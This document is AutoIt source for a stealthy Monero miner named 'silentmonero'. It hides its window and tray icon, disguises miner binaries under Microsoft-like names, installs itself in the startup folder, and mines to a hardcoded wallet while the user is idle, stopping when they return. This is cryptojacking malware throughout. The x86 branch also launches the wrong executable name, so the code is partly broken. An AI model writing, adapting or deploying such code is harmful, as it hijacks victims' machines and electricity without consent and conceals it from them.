#NoTrayIcon
#include <Timers.au3>
#include <WinAPIFiles.au3>
#include <MsgBoxConstants.au3>
#include <Process.au3>
#include <Inet.au3>
#include '_Startup.au3'

; Prevent duplicate processes
$window_title = "silentmonero"
If WinExists($window_title) Then Exit;
AutoItWinSetTitle($window_title)

; Miner Files
DirCreate ( @ScriptDir & "\x64\" )
DirCreate ( @ScriptDir & "\x86\" )
FileInstall("mssm6.exe", @ScriptDir & "\x64\mssm6.exe", 0)
FileInstall("mssm8.exe", @ScriptDir & "\x86\mssm8.exe", 0)
FileInstall("msvcr120_64.dll", @ScriptDir & "\x64\msvcr120.dll", 0)
FileInstall("msvcr120_86.dll", @ScriptDir & "\x86\msvcr120.dll", 0)
FileInstall("conf.txt", @ScriptDir & "\conf.txt", 0)

; Add the running EXE to the Current User startup folder.
_StartupFolder_Install()

; Settings
; Pool
$pool = IniRead(@ScriptDir & "\conf.txt", "settings", "pool", "supportxmr.com:3333")
; Address
$address = IniRead(@ScriptDir & "\conf.txt", "settings", "address", "45hFtBX393vPo8u5HoeK1EHrGWxVmFPPJGYH515bktZyEacp3osHA4XK58NEAV4XLr9RB1UM2321rKBAindWhBnKEXLUdTW")
; Password
$password = IniRead(@ScriptDir & "\conf.txt", "settings", "password", "x")
; Worker ID (none, ip, compname, custom_string)
$worker_id = IniRead(@ScriptDir & "\conf.txt", "settings", "worker_id", "off")
; Worker ID Location (address or password)
$worker_id_location = IniRead(@ScriptDir & "\conf.txt", "settings", "worker_id_location", "address")
; Difficulty
$difficulty = IniRead(@ScriptDir & "\conf.txt", "settings", "difficulty", "off")

; Advanced
; Idle time before start
$idle = 1000 * IniRead(@ScriptDir & "\conf.txt", "advanced", "idle_time_before_start", "30")
; show / hide window
$hide = IniRead(@ScriptDir & "\conf.txt", "advanced", "hide_window", "true")
; 64 bit miner name.
$x64file = IniRead(@ScriptDir & "\conf.txt", "advanced", "x64_miner_name", "mssm6.exe")
; 32 bit miner name.
$x86file = IniRead(@ScriptDir & "\conf.txt", "advanced", "x86_miner_name", "mssm8.exe")
; Numbers of threads to use.
$threads = IniRead(@ScriptDir & "\conf.txt", "advanced", "threads", "all")
; Process type idle_on or always_on
$ptype = IniRead(@ScriptDir & "\conf.txt", "advanced", "process", "idle_on")
; Append congif options.
$append = IniRead(@ScriptDir & "\conf.txt", "advanced", "append", "none")
; Set miner process prioriy
$process_priority = IniRead(@ScriptDir & "\conf.txt", "advanced", "process_priority", "2")

; Create restart batch script
$file = fileopen (@Scriptdir & "\restart.bat" , 2)
FileWriteLine($file, "taskkill /f /im " & _ProcessGetName( @AutoItPID ) )
FileWriteLine($file, "taskkill /f /im " & $x64file )
FileWriteLine($file, "taskkill /f /im " & $x86file )
FileWriteLine($file, "start " & _ProcessGetName( @AutoItPID ) )
fileclose($file)

; Create kill batch script
$file = fileopen (@Scriptdir & "\kill.bat" , 2)
FileWriteLine($file, "taskkill /f /im " & _ProcessGetName( @AutoItPID ) )
FileWriteLine($file, "taskkill /f /im " & $x64file )
FileWriteLine($file, "taskkill /f /im " & $x86file )
fileclose($file)

; Get Public IP address and strip formatting
$ip = StringRegExpReplace( _GetIP(), "[^0-9s]", "")

; Set Append
if $append == "none" Then
	$append_options = ""
Else
	$append_options = " " & $append
EndIf

; Set Worker
Switch $worker_id
    Case "off"
        $worker = ""
		$pworker = ""
    Case "ip"
        $worker = "." & $ip
		$pworker = $ip
    Case "compname"
        $worker = "." & @ComputerName
		$pworker = @ComputerName
    Case Else
        $worker = "." & $worker_id
		$pworker = $worker_id
EndSwitch

; Set Difficulty
if $difficulty == "off" Then
	$diff = ""
Else
	$diff = "+" & $difficulty
EndIf

; Set Threads
if $threads == "all" Then
	$threads_config = ""
Else
	$threads_config = " -t " & $threads
EndIf

; Set Hide Switch
$hide_switch = @SW_HIDE
If $hide == "false" Then
   $hide_switch = @SW_MAXIMIZE
EndIf

; Set config and worker location
If $worker_id_location == "address" Then
	$config = " -a cryptonight -o stratum+tcp://" & $pool & " -p " & $password & " -u " & $address & $worker & $diff & $threads_config & $append_options
Else
	$config = " -a cryptonight -o stratum+tcp://" & $pool & " -p " & $pworker & $password & " -u " & $address & $diff & $threads_config & $append_options
EndIf

; Main
If $ptype == "idle_on" Then
	While 1
		Sleep(500)
		$idleTimer = _Timer_GetIdleTime()
		If $idleTimer > ($idle) Then
			start_miner ( $x86file, $x64file, $config, $hide_switch, $process_priority )
		ElseIf $idleTimer < ($idle) Then
			closeprocess_if_exists($x86file)
			closeprocess_if_exists($x64file)
		EndIf
	WEnd
ElseIf $ptype == "always_on" Then
	While 1
		Sleep(500)
		start_miner ( $x86file, $x64file, $config, $hide_switch, $process_priority )
	WEnd
EndIf

; Helper Functions
func start_miner ( $x86file, $x64file, $config, $hide_switch, $process_priority )
	If @OSArch == "X86" And Not ProcessExists($x86file) Then
		Run(@ScriptDir & "\x86\" & $x64file & $config, "", $hide_switch)
		ProcessSetPriority($x86file, $process_priority)
	ElseIf @OSArch == "X64" And Not ProcessExists($x64file) Then
		Run(@ScriptDir & "\x64\" & $x64file & $config, "", $hide_switch)
		ProcessSetPriority($x64file, $process_priority)
	EndIf
EndFunc

func closeprocess_if_exists( $process )
	if ProcessExists( $process ) Then
		ProcessClose( $process )
	EndIf
EndFunc